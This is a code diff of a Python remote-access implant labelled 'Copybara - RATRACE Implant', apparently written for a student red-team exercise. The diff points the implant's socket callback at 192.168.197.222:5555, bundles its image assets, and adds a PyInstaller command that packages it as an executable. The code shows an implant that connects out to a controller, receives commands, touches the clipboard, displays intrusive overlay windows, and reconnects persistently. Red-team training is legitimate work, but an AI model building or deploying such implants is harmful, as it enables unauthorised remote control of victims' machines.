@@ -1,7 +1,10 @@
 import socket
 import subprocess
+import sys
 import threading
 import pyperclip
+from pathlib import Path
+from typing import Union
 import time
 import tkinter as tk
 from PIL import Image, ImageTk
@@ -26,6 +29,13 @@ art = r"""
 Can't Stop Won't Stop | Copybara - RATRACE Implant | mjw6944@rit.edu
 """
 
+def resource_path(relative_path: Union[
+    str, Path]) -> Path:
+    base_dir = Path(__file__).parent
+    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
+        base_dir = Path(sys._MEIPASS)
+    return base_dir / relative_path
+
 def connect():
     help_text = """Available commands:
 help - Display this help message
@@ -37,7 +47,7 @@ INTERACTIVE ONLY COMMANDS:
 duration [time] - sets duration
 splash - sends splash art"""
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("127.0.0.1", 5555))
+    s.connect(("192.168.197.222", 5555))
     failsafe = 0
     duration = 120
     while failsafe < 20:
@@ -85,7 +95,7 @@ def window(duration):
     box.attributes('-alpha', 0.6)
     box.protocol("delete", onClosing())
     box.overrideredirect(True)
-    img = Image.open('gort.png')
+    img = Image.open(resource_path(Path('copydata') / 'gort.png'))
     img = ImageTk.PhotoImage(img)
     label =tk.Label(box, image=img)
     label.pack(expand=True)
@@ -100,7 +110,7 @@ def bounce(duration):
     screen_w = box.winfo_screenwidth()
     screen_h = box.winfo_screenheight()
     state = {"x": 100, "y": 100, "dx": 3, "dy": 3}
-    img = Image.open('rodent.png')
+    img = Image.open(resource_path(Path('copydata') / 'rodent.png'))
     img = ImageTk.PhotoImage(img)
     box.attributes('-topmost', True)
     label = tk.Label(box, image=img)
@@ -134,3 +144,4 @@ if __name__ == "__main__":
             connect()
         except Exception as e:
             time.sleep(5)
+#implants>pyinstaller --onedir --add-data "copydata/*.png:copydata/" --icon="copydata/icon.ico" copybarav2.py
